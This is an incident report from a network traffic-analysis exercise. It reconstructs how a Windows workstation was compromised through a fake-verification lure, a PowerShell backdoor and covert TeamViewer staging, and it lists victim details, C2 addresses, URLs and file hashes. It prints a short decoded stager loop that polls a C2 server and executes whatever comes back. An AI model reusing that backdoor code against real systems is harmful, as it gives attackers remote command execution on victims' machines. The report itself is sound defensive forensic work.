# Incident Report — mta-2025-01-22

**Capture window:** 2025-01-22 23:44:56 to 2025-01-23 00:38:18 (UTC+4), duration 3202 sec (~53 min)
**Evidence reviewed:** `2025-01-22-traffic-analysis-exercise.pcap` (no separate IDS export was present in the evidence directory)

## Victim host

| Field | Value | Evidence |
|---|---|---|
| IPv4 | 10.1.17.215 | Top talker in `conv,ip`; source of all malicious activity below |
| MAC | 00:d0:b7:26:4a:74 | ARP reply and Ethernet source for 10.1.17.215 |
| Windows hostname | DESKTOP-L8C5GSJ | DHCP `dhcp.option.hostname`, confirmed by NBNS `<00>`/`<20>` registrations |
| NetBIOS workgroup | BLUEMOONTUESDAY | NBNS name registrations from 10.1.17.215 |
| Logged-in user | shutchenson | Kerberos `CNameString` in AS-REQ/TGS-REQ traffic between 10.1.17.215 and the domain controller 10.1.17.2 |

## Malware family and attribution

**Behavioral classification:** ClickFix-style fake-verification lure leading to a custom, disk-serial-keyed PowerShell polling backdoor, which stages a covertly-deployed TeamViewer instance for hands-on-keyboard remote access (RMM-tool abuse for post-exploitation).

**Attribution confidence: behavioral**, not signature-confirmed. No AV/YARA/hash-reputation lookup was performed (no internet access permitted for this analysis), so no named-family hash match exists. The classification rests on the following observed behavior chain, reconstructed directly from decoded payloads in the capture:

1. **t=39s** — 10.1.17.215 resolves and connects via TLS to `authenticatoor.org` (82.221.136.26:443). The domain name and its position at the very start of the malicious activity is consistent with a fake CAPTCHA/"verify you are human" (ClickFix) page that tricks the user into pasting and running a PowerShell command via the Windows Run dialog.
2. **t=60s** — 10.1.17.215 begins issuing `GET http://5.252.153.241/api/file/get-file/29842.ps1`. The downloaded script (`29842.ps1`, and later `pas.ps1`, byte-identical logic with different junk-comment padding to churn the hash) is a Base64-in-`Invoke-Expression` stager. Decoding it reveals:
   ```
   $SerialNumber = $fso.GetDrive("c:\").SerialNumber   # used as a per-victim bot ID
   $ip = 'http://5.252.153.241/'
   $url = $ip + $serial
   while ($true) {
       $result = $s.DownloadString($url)   # poll C2 for a command
       Invoke-Expression $result           # execute whatever the C2 returns
       Start-Sleep -s 5
   }
   ```
   This confirms 5.252.153.241 is the primary C2 server, and that the recurring `GET /1517096937` beacon (seen 100+ times, every ~5.2s) is this infected host polling with its disk volume serial number as bot ID.
3. The C2 responses include status-report call-backs from the implant itself: `?k=message = startup shortcut created; status = success;` and `?k=script: RunRH, status: OK, message: PS process started` — confirming the implant installs persistence (a startup shortcut) and self-reports execution status back to the C2.
4. **t=125-129s** — the C2 pushes down and the host retrieves `TeamViewer` (4,380,968 bytes, a genuine TeamViewer PE binary), `Teamviewer_Resource_fr` (668,968 bytes, French language resource), and `TV` (12,920 bytes, a stripped PE32 DLL) via the same `/api/file/get-file/` API, followed immediately by `pas.ps1`. A separate large C2 response (354KB) instructs the host to create `C:\ProgramData\jsLeow\skqllz.ps1` and write a further multi-layer, variable-name-obfuscated Base64/reflective-loader PowerShell payload to it — consistent with silently installing/hiding a TeamViewer instance for attacker remote-hands access rather than a legitimate user-initiated TeamViewer session.
5. **t=889s and t=917s** — roughly 13 minutes after TeamViewer is staged, the host opens new outbound sessions to 45.125.66.32 on TCP/2917 and 45.125.66.252 on TCP/443, both over TLS with the raw IP address (not a hostname) used in place of/as the SNI value and no corresponding DNS lookup. A non-standard port (2917) carrying TLS with a bare-IP SNI is a strong secondary-C2/attacker-infrastructure tell rather than legitimate TeamViewer relay traffic (real TeamViewer client traffic in this same capture, to `master16.teamviewer.com`, resolves normally via DNS and uses TeamViewer's standard din/dout API over HTTP).

## Indicators of Compromise

All values below were directly observed in the capture; none are copied from external threat intelligence.

**C2 endpoints (IP:port)**
| Indicator | Evidence |
|---|---|
| 5.252.153.241:80 | Primary C2 — polling backdoor beacon `GET /1517096937` (disk-serial bot ID) every ~5.2s; also the `/api/file/get-file/*` payload-staging endpoint |
| 45.125.66.32:2917 | Secondary/post-exploitation channel — TLS, bare-IP used as SNI, non-standard port, first seen t=889s, no DNS resolution |
| 45.125.66.252:443 | Related secondary channel — TLS, no SNI at all, first seen t=917s, no DNS resolution |

**Malicious domain**
| Indicator | Evidence |
|---|---|
| authenticatoor.org (82.221.136.26) | First malicious contact in the capture (t=39s), DNS A-record resolved and confirmed by TLS SNI on port 443; name and timing consistent with a fake CAPTCHA/verification (ClickFix) delivery page |

**Malicious URLs**
| Indicator | Evidence |
|---|---|
| http://5.252.153.241/1517096937 (and status-report variants `?k=message = startup shortcut created; status = success;`, `?k=script: RunRH, status: OK, message: PS process started`) | Beacon/check-in traffic, `http.request.uri`, host header is the literal C2 IP |
| http://5.252.153.241/api/file/get-file/264872 | First file fetch on the C2 connection (t=60s) |
| http://5.252.153.241/api/file/get-file/29842.ps1 | Base64/IEX PowerShell stager download |
| http://5.252.153.241/api/file/get-file/pas.ps1 | Same stager, re-served with different junk padding (hash churn) |
| http://5.252.153.241/api/file/get-file/TeamViewer | Staged TeamViewer main binary |
| http://5.252.153.241/api/file/get-file/Teamviewer_Resource_fr | Staged TeamViewer language resource |
| http://5.252.153.241/api/file/get-file/TV | Staged PE32 DLL helper module |

**Transferred files / hashes (SHA-256, computed from objects exported out of this capture with `tshark --export-objects http`)**
| File name | SHA-256 | Evidence |
|---|---|---|
| 29842.ps1 | b8ce40900788ea26b9e4c9af7efab533e8d39ed1370da09b93fcf72a16750ded | Base64/IEX PowerShell stager retrieved from C2 |
| pas.ps1 | a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e | Same stager logic, retrieved 66s later with different comment padding |
| TeamViewer | 904280f20d697d876ab90a1b74c0f22a83b859e8b0519cb411fda26f1642f53e | Staged TeamViewer PE executable, delivered by the C2 (not from teamviewer.com) |
| Teamviewer_Resource_fr | 9634ecaf469149379bba80a745f53d823948c41ce4e347860701cbdff6935192 | Staged TeamViewer resource file |
| TV | 3448da03808f24568e6181011f8521c0713ea6160efd05bff20c43b091ff59f7 | Staged PE32 DLL, stripped, delivered by the C2 |

## Benign context (do not treat as IOCs)

- `au.download.windowsupdate.com`, `download.windowsupdate.com`, `ctldl.windowsupdate.com` — legitimate Windows Update / Defender signature and certificate trust list (CTL) traffic, including `am_delta_patch_1.421.1491.0_*.exe` (Defender definition update) and `disallowedcertstl.cab`/`pinrulesstl.cab`.
- `master16.teamviewer.com` — legitimate TeamViewer client "DynGate" handshake traffic (`din.aspx`/`dout.aspx`), separate from the attacker-staged TeamViewer binary above; likely the TeamViewer instance phoning home once installed.
- `msedge.b.tlu.dl.delivery.mp.microsoft.com`, `www.msftconnecttest.com` — Microsoft delivery-optimization CDN and connectivity test, routine Windows background traffic.
- Kerberos/LDAP/DCERPC/SMB2 traffic between 10.1.17.215 and 10.1.17.2 — normal domain-joined workstation authentication and directory activity (10.1.17.2 is the domain controller).

## Incident summary

The Windows workstation DESKTOP-L8C5GSJ (10.1.17.215, MAC 00:d0:b7:26:4a:74), logged in as domain user shutchenson, was compromised after visiting the fake-verification page authenticatoor.org at t=39s, consistent with a ClickFix-style social-engineering lure that tricks the user into pasting and executing a PowerShell command. That command established a disk-serial-keyed polling backdoor to 5.252.153.241 (beaconing every ~5.2 seconds), which was used to stage further obfuscated PowerShell and to silently deploy a TeamViewer instance for attacker hands-on remote access; roughly 13 minutes later the host opened additional TLS sessions to bare-IP endpoints 45.125.66.32:2917 and 45.125.66.252:443 consistent with continued post-exploitation activity. Attribution to a named malware family is behavioral only (multi-layer obfuscated PowerShell IEX stagers, disk-serial bot IDs, and TeamViewer-based remote-access staging), as no signature/hash-reputation lookup was performed.
